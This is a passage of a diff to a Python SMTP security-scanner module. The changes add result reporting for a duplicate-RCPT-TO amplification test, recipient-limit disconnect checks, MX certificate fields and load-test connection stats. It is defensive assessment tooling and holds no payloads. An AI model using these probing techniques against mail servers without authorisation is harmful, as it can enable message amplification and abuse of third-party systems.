             if rl.connected is not None and rl.connected >= RATE_LIMIT_CONN_VULN_THRESHOLD:
@@ -14610,12 +15311,18 @@ class SMTP(BaseModule):
             return props, vulns
         if rlim.limit_triggered:
             obj: dict = {"maxAccepted": rlim.max_accepted, "limitTriggered": True}
+            disc = getattr(rlim, "disconnect_after_limit", None)
+            if disc is not None:
+                obj["disconnectAfterLimit"] = bool(disc)
+                obj["posthitProbeCount"] = int(getattr(rlim, "posthit_probe_count", 0))
             if precheck_obj:
                 obj["precheck"] = precheck_obj
             props["rcptLimit"] = obj
             ma = rlim.max_accepted if rlim.max_accepted is not None else 0
             if ma > RCPT_LIMIT_VERDICT_WARN_MAX:
                 vulns.append({"vuln_code": VULNS.ManyRcpt.value})
+            if disc is False:
+                vulns.append({"vuln_code": VULNS.RcptNoCut.value})
             return props, vulns
         if rlim.max_accepted == 0:
             obj = {"maxAccepted": 0, "limitTriggered": False, "couldNotTest": True}
@@ -14627,6 +15334,57 @@ class SMTP(BaseModule):
         if precheck_obj:
             obj["precheck"] = precheck_obj
         props["rcptLimit"] = obj
+        return props, vulns
+
+    def _rcpt_duplicate_for_json(self) -> tuple[dict, list[dict]]:
+        """Duplicate RCPT TO (-rdd): properties + optional PTV when many identical RCPT are accepted."""
+        props: dict = {}
+        vulns: list[dict] = []
+        if (err := self.results.rcpt_duplicate_error) is not None:
+            props["rcptDuplicateError"] = err
+            return props, vulns
+        if (rd := self.results.rcpt_duplicate) is None:
+            return props, vulns
+        _rdd_analyst_note = (
+            "After DATA, sound implementations usually deliver a single mailbox copy even when the same "
+            "address appeared in RCPT TO multiple times (no data amplification). Several delivered copies "
+            "for one submitted message indicate risky fan-out. Inspect Delivered-To and Received lines: "
+            "sometimes only one copy arrives but headers still reflect duplicate envelope recipients "
+            "(possible informational leak)."
+        )
+        props["rcptDuplicate"] = {
+            "testId": "PTL-SVC-SMTP-RCPT-DUP",
+            "recipient": rd.recipient,
+            "duplicateCount": rd.duplicate_count,
+            "rcptReplies": [{"smtpCode": c, "reply": rep} for c, rep in rd.rcpt_replies],
+            "allRcpt2xx": rd.all_rcpt_2xx,
+            "firstFailureIndex": rd.first_failure_index,
+            "dataSent": rd.data_sent,
+            "dataSmtpCode": rd.data_code,
+            "dataReply": rd.data_reply_snippet,
+            "mailFromUsed": rd.mail_from_used,
+            "probeUuid": rd.probe_uuid,
+            **({"analystNote": _rdd_analyst_note} if rd.all_rcpt_2xx else {}),
+        }
+        if rd.all_rcpt_2xx and rd.duplicate_count >= 3:
+            vulns.append(
+                {
+                    "vuln_code": VULNS.RcptDuplicate.value,
+                    "vuln_request": (
+                        f"Same recipient accepted {rd.duplicate_count} times as separate RCPT TO "
+                        f"in one MAIL transaction ({rd.recipient!r})"
+                    ),
+                    "vuln_response": (
+                        "SMTP returned 2xx for each duplicate RCPT TO — envelope semantics treat them as "
+                        "separate recipients; after DATA, correct handling should still yield one logical "
+                        "delivery without amplification. If the recipient receives multiple distinct copies, "
+                        "that matches this finding (PTV-SVC-SMTP-RCPTDUP). Verify manually with --rdd-send "
+                        "and mailbox/logs; also review Delivered-To / Received: a single message may "
+                        "still expose repeated routing (informational leak)."
+                    ),
+                    "vuln_note": _rdd_analyst_note,
+                }
+            )
         return props, vulns
 
     def output(self) -> None:
@@ -14644,7 +15402,10 @@ class SMTP(BaseModule):
             flat_vulns = self._collect_flat_vulns()
             _, _rcpt_vulns = self._rcpt_limit_for_json()
             flat_vulns.extend(_rcpt_vulns)
+            _rdd_p, _rdd_v = self._rcpt_duplicate_for_json()
+            flat_vulns.extend(_rdd_v)
             props: dict = {"description": description}
+            props.update(_rdd_p)
             if (ad := self.results.auth_downgrade) is not None:
                 props["authDowngrade"] = {
                     "vulnerable": ad.vulnerable,
@@ -14780,6 +15541,11 @@ class SMTP(BaseModule):
                     "tlsCipherWarnings": getattr(id_r, "tls_cipher_warnings", None) or [],
                     "tlsDowngradeFindings": getattr(id_r, "tls_downgrade_findings", None) or [],
                     "tlsDowngradeProbed": getattr(id_r, "tls_downgrade_probed", False),
+                    "certDomainMatch": getattr(id_r, "cert_domain_match", False),
+                    "mxCertOk": getattr(id_r, "mx_cert_ok", None),
+                    "mxCertMessage": getattr(id_r, "mx_cert_message", None),
+                    "mxQueriedDomain": getattr(id_r, "mx_queried_domain", None),
+                    "mxPeerHostname": getattr(id_r, "mx_peer_hostname", None),
                     "osHint": getattr(id_r, "os_hint", None),
                     "dataLeakage": [
                         {
@@ -15104,6 +15870,10 @@ class SMTP(BaseModule):
         _rcpt_p, _rcpt_v = self._rcpt_limit_for_json(rcpt_vuln_detail=True)
         properties.update(_rcpt_p)
         global_vulns.extend(_rcpt_v)
+
+        _rdd_p, _rdd_v = self._rcpt_duplicate_for_json()
+        properties.update(_rdd_p)
+        global_vulns.extend(_rdd_v)
 
         _adp_props = self._accepted_domain_probe_props_json()
         if _adp_props:
@@ -15706,6 +16476,9 @@ class SMTP(BaseModule):
                     "maxRtSeconds": nf2.max_rt_seconds,
                     "avgRtSeconds": nf2.avg_rt_seconds,
                     "errorRatePct": nf2.error_rate_pct,
+                    "activeConnectionsEnd": nf2.active_connections_end,
+                    "disconnectedDuringTest": nf2.disconnected_during_test,
+                    "earlyExitNoConnections": nf2.early_exit_no_connections,
                 }
             })
 
